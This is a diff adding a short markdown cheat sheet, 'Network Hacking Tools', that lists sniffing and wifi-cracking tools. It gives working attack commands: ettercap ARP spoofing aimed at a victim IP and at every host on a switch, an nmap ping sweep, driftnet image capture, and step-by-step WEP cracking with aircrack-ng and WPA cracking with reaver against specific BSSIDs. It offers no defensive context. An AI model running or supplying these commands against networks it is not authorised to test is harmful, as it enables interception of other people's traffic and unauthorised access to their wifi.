@@ -1,0 +1,42 @@
+Network Hacking Tools
+=====================
+## Tools
+wireshark
+driftnet
+aircrack
+airoplay
+airodump
+iftop
+airsnort
+airfart
+aimsniff
+reaver (to obtain WPA wifi passwords)
+## ettercap
+ARP attack on switch (first IP is victim)
+  ettercap -T -Q -M arp:remote -i eth1 /192.168.0.12/ // -P remote_browser
+ARP attack EVERYONE so driftnet will work on switch
+  ettercap -T -Q -M arp:remote -i eth0 // //
+## nmap
+find every one on network
+nmap -sP 192.168.0.*
+## aimsniff
+aimsniff --nodb
+## airodump
+airodump-ng --write outfile eth1
+## driftnet
+driftnet -i eth1
+## WEP cracking
+/etc/init.d/NetworkManager stop
+/etc/init.d/dhcdbd stop
+airmon-ng start eth1
+airodump-ng -c 11 --bssid 00:18:39:87:1E:40 -w dump eth1
+aircrack-ng -b 00:14:BF:2B:B1:88 dump-01.cap
+http://www.aircrack-ng.org/doku.php?id=newbie_guide
+http://cri.ch/linux/docs/sk0016.html
+## WPA cracking
+http://lifehacker.com/5873407/how-to-crack-a-wi-fi-networks-wpa-password-with-reaver
+airmon-ng start wlan0
+airodump-ng wlan0
+reaver -i wlan0 -b 8D:AE:9D:65:1F:B2 -vv
+
+
